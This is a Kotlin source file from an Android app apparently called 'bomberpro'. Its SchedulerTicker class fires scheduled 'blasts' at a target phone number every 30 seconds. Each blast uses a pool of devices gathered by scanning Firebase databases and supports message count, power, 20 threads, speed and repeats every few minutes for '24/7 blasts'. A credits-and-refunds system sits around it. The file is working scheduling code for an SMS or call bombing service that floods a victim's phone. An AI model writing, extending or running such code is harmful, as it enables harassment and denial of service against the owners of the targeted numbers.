package com.sanji.bomberpro.services

import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import java.util.concurrent.atomic.AtomicBoolean

/**
 * In-process scheduler ticker.
 * Runs while the app is open. Every 30s checks due schedules and fires them.
 *
 * NOTE: Does NOT fire if the app is fully closed. Schedules fire only while
 * the app process is alive. For 24/7 blasts, keep app open or use the bot.
 */
class SchedulerTicker(private val scope: CoroutineScope) {

    private val db = FirebaseFirestore.getInstance()
    private val schedulerService = SchedulerService()
    private val userData = UserDataService()
    private val rtdb = RealtimeDbService()
    private var job: Job? = null
    private val running = AtomicBoolean(false)

    fun start() {
        if (job?.isActive == true) return
        job = scope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    tickOnce()
                } catch (e: Exception) {
                    Log.w(TAG, "tick failed", e)
                }
                delay(30_000)
            }
        }
    }

    fun stop() {
        job?.cancel()
        job = null
    }

    private suspend fun tickOnce() {
        val due = schedulerService.getDueSchedules()
        if (due.isEmpty()) return

        val devices = try {
            val fbs = rtdb.loadFirebases()
            rtdb.scanAll(fbs)
        } catch (_: Exception) {
            emptyList()
        }

        for (schedule in due) {
            if (!running.compareAndSet(false, true)) return
            try {
                fireSchedule(schedule, devices)
            } catch (e: Exception) {
                Log.w(TAG, "fire failed: ${schedule.id}", e)
            } finally {
                running.set(false)
            }
        }
    }

    private suspend fun fireSchedule(
        schedule: ScheduledBlast,
        devices: List<Device>,
    ) {
        if (!schedulerService.markRunning(schedule.id)) return

        // direct user doc read
        val userDoc = try {
            db.collection(FirebaseConfig.COL_USERS).document(schedule.uid).get().await()
        } catch (e: Exception) {
            Log.w(TAG, "user read failed: ${schedule.uid}", e)
            null
        }

        if (userDoc == null || !userDoc.exists()) {
            schedulerService.markComplete(schedule.id, ScheduledRunResult(error = "user missing"))
            return
        }

        val banned = userDoc.getBoolean("banned") ?: false
        if (banned) {
            schedulerService.markComplete(schedule.id, ScheduledRunResult(error = "user banned"))
            return
        }

        val userRole = userDoc.getString("role") ?: "user"
        val isAdmin = userRole == "owner" || userRole == "super_admin" || userRole == "admin"

        if (devices.isEmpty()) {
            schedulerService.markComplete(schedule.id, ScheduledRunResult(error = "no devices"))
            return
        }

        val speedEnum = try {
            BlastSpeed.valueOf(schedule.speed.uppercase())
        } catch (_: Exception) {
            BlastSpeed.FAST
        }

        val executor = BlastExecutor(rtdb)
        var sentTotal = 0
        var failedTotal = 0
        var refundedTotal = 0
        var errorMsg: String? = null

        try {
            val cancelFlag = AtomicBoolean(false)
            executor.execute(
                uid = schedule.uid,
                isAdmin = isAdmin,
                userData = userData,
                userName = schedule.userName,
                userEmail = schedule.userEmail,
                devices = devices,
                target = schedule.target,
                message = schedule.message,
                count = schedule.count,
                power = schedule.power,
                threads = 20,
                speed = speedEnum,
                cancelFlag = cancelFlag,
            ).collect { event ->
                when (event) {
                    is BlastEvent.Complete -> {
                        sentTotal = event.sent
                        failedTotal = event.failed
                        refundedTotal = event.refundedCredits
                    }
                    is BlastEvent.Error -> {
                        errorMsg = event.message
                    }
                    else -> Unit
                }
            }
        } catch (e: Exception) {
            errorMsg = e.message
        }

        try {
            userData.logActivity(
                uid = schedule.uid,
                userName = schedule.userName,
                userEmail = schedule.userEmail,
                action = "scheduled_blast",
                targetMasked = userData.maskNumber(schedule.target),
                targetFull = schedule.target,
                details = mapOf(
                    "scheduleId" to schedule.id,
                    "sent" to sentTotal,
                    "failed" to failedTotal,
                    "refunded" to refundedTotal,
                    "error" to (errorMsg ?: ""),
                ),
            )
        } catch (_: Exception) {}

        try {
            val notifRef = db.collection(FirebaseConfig.COL_NOTIFICATIONS).document()
            notifRef.set(
                mapOf(
                    "id" to notifRef.id,
                    "uid" to schedule.uid,
                    "title" to "Scheduled blast fired",
                    "body" to "Target: ${userData.maskNumber(schedule.target)} · sent: $sentTotal · failed: $failedTotal",
                    "type" to "schedule",
                    "read" to false,
                    "ts" to System.currentTimeMillis() / 1000L,
                )
            )
        } catch (_: Exception) {}

        if (schedule.repeatMinutes > 0) {
            val nextAt = System.currentTimeMillis() / 1000L + schedule.repeatMinutes * 60L
            schedulerService.markRescheduled(schedule.id, nextAt)
        } else {
            schedulerService.markComplete(
                schedule.id,
                ScheduledRunResult(
                    id = schedule.id,
                    sent = sentTotal,
                    failed = failedTotal,
                    refunded = refundedTotal,
                    error = errorMsg,
                ),
            )
        }
    }

    companion object {
        private const val TAG = "SchedulerTicker"
    }
}